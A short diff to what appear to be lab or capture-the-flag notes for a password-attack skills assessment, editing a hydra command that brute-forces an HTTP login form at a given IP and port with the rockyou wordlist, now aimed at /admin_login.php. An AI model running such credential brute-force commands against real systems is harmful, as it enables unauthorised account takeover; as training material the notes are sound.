@@ -68,7 +68,7 @@ hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterd
 Hint: You may reuse the username you found earlier. Make sure you got the correct fail string and parameters.
 
 ```bash
-hydra -l user -P /usr/share/wordlists/rockyou.txt -f 83.136.254.230 -s 42335 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
+hydra -l user -P /usr/share/wordlists/rockyou.txt -f 83.136.254.230 -s 42335 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
 ```
 
 ## Skills Assessment - Service Login
